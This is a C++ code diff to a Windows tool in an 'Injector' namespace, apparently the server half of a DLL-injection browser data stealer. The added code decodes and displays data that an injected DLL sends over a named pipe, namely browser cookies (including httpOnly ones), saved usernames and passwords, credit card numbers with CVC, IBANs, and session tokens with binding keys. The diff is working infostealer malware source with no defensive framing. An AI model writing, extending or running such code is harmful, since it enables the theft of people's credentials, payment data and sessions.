@@ -8,6 +8,10 @@
 #include <algorithm>
 #include <sstream>
 #include <regex>
+#include <windows.h>
+#include <wincrypt.h>
+
+#pragma comment(lib, "crypt32.lib")
 
 namespace Injector {
 
@@ -17,7 +21,7 @@ namespace Injector {
     void PipeServer::Create() {
         m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
                                        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
-                                       1, 4096, 4096, 0, nullptr));
+                                       1, 65536, 65536, 0, nullptr));
         
         if (!m_hPipe) {
             throw std::runtime_error("CreateNamedPipeW failed: " + std::to_string(GetLastError()));
@@ -48,10 +52,29 @@ namespace Injector {
         }
     }
 
+    // Helper function to base64 decode
+    std::string Base64Decode(const std::string& input) {
+        if (input.empty()) return "";
+        
+        DWORD decodedSize = 0;
+        if (!CryptStringToBinaryA(input.c_str(), (DWORD)input.size(), 
+                                 CRYPT_STRING_BASE64, nullptr, &decodedSize, nullptr, nullptr)) {
+            return ""; // Return empty on failure
+        }
+        
+        std::vector<BYTE> buffer(decodedSize);
+        if (!CryptStringToBinaryA(input.c_str(), (DWORD)input.size(), 
+                                 CRYPT_STRING_BASE64, buffer.data(), &decodedSize, nullptr, nullptr)) {
+            return ""; // Return empty on failure
+        }
+        
+        return std::string((char*)buffer.data(), decodedSize);
+    }
+
     void PipeServer::ProcessMessages(bool verbose) {
         const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
         std::string accumulated;
-        char buffer[4096];
+        char buffer[65536];
         bool completed = false;
         DWORD startTime = GetTickCount();
 
@@ -140,6 +163,107 @@ namespace Injector {
                     size_t sep = data.find('|');
                     if (sep != std::string::npos) {
                         console.DataRow(data.substr(0, sep), data.substr(sep + 1));
+                    }
+                }
+                else if (msg.rfind("COOKIE_DETAIL:", 0) == 0) {
+                    // Format: COOKIE_DETAIL:BASE64(domain)|BASE64(name)|BASE64(value)|expires|secure|httponly|BASE64(path)
+                    std::string data = msg.substr(14);
+                    std::vector<std::string> parts;
+                    size_t pos = 0;
+                    while ((pos = data.find('|')) != std::string::npos) {
+                        parts.push_back(data.substr(0, pos));
+                        data.erase(0, pos + 1);
+                    }
+                    parts.push_back(data);
+                    
+                    if (parts.size() == 7) {
+                        // Base64 decode ALL text fields
+                        std::string domain = Base64Decode(parts[0]);
+                        std::string name = Base64Decode(parts[1]);
+                        std::string value = Base64Decode(parts[2]);
+                        std::string expires = parts[3];  // numeric
+                        bool secure = parts[4] == "1";
+                        bool httpOnly = parts[5] == "1";
+                        std::string path = Base64Decode(parts[6]);
+                        
+                        console.DisplayCookie(domain, name, value, expires, secure, httpOnly, path);
+                    }
+                }
+                else if (msg.rfind("PASSWORD_DETAIL:", 0) == 0) {
+                    // Format: PASSWORD_DETAIL:BASE64(url)|BASE64(username)|BASE64(password)
+                    std::string data = msg.substr(16);
+                    std::vector<std::string> parts;
+                    size_t pos = 0;
+                    while ((pos = data.find('|')) != std::string::npos) {
+                        parts.push_back(data.substr(0, pos));
+                        data.erase(0, pos + 1);
+                    }
+                    parts.push_back(data);
+                    
+                    if (parts.size() == 3) {
+                        // Base64 decode ALL fields
+                        std::string url = Base64Decode(parts[0]);
+                        std::string username = Base64Decode(parts[1]);
+                        std::string password = Base64Decode(parts[2]);
+                        
+                        console.DisplayPassword(url, username, password);
+                    }
+                }
+                else if (msg.rfind("CARD_DETAIL:", 0) == 0) {
+                    // Format: CARD_DETAIL:BASE64(name)|BASE64(number)|BASE64(expiry)|BASE64(cvc)
+                    std::string data = msg.substr(12);
+                    std::vector<std::string> parts;
+                    size_t pos = 0;
+                    while ((pos = data.find('|')) != std::string::npos) {
+                        parts.push_back(data.substr(0, pos));
+                        data.erase(0, pos + 1);
+                    }
+                    parts.push_back(data);
+                    
+                    if (parts.size() == 4) {
+                        // Base64 decode ALL fields
+                        std::string name = Base64Decode(parts[0]);
+                        std::string number = Base64Decode(parts[1]);
+                        std::string expiry = Base64Decode(parts[2]);
+                        std::string cvc = Base64Decode(parts[3]);
+                        
+                        console.DisplayCard(name, number, expiry, cvc);
+                    }
+                }
+                else if (msg.rfind("IBAN_DETAIL:", 0) == 0) {
+                    // Format: IBAN_DETAIL:BASE64(nickname)|BASE64(iban)
+                    std::string data = msg.substr(12);
+                    size_t pos = data.find('|');
+                    if (pos != std::string::npos) {
+                        // Base64 decode ALL fields
+                        std::string nickname = Base64Decode(data.substr(0, pos));
+                        std::string iban = Base64Decode(data.substr(pos + 1));
+                        
+                        console.DisplayIBAN(nickname, iban);
+                    }
+                }
+                else if (msg.rfind("TOKEN_DETAIL:", 0) == 0) {
+                    // Format: TOKEN_DETAIL:BASE64(service)|BASE64(token)|BASE64(binding_key)
+                    std::string data = msg.substr(13);
+                    std::vector<std::string> parts;
+                    size_t pos = 0;
+                    while ((pos = data.find('|')) != std::string::npos) {
+                        parts.push_back(data.substr(0, pos));
+                        data.erase(0, pos + 1);
+                    }
+                    parts.push_back(data);
+                    
+                    if (parts.size() >= 2) {
+                        // Base64 decode ALL fields
+                        std::string service = Base64Decode(parts[0]);
+                        std::string token = Base64Decode(parts[1]);
+                        
+                        std::string bindingKey = "";
+                        if (parts.size() >= 3) {
+                            bindingKey = Base64Decode(parts[2]);
+                        }
+                        
+                        console.DisplayToken(service, token);
                     }
                 }
                 else if (msg.rfind("[-]", 0) == 0) {
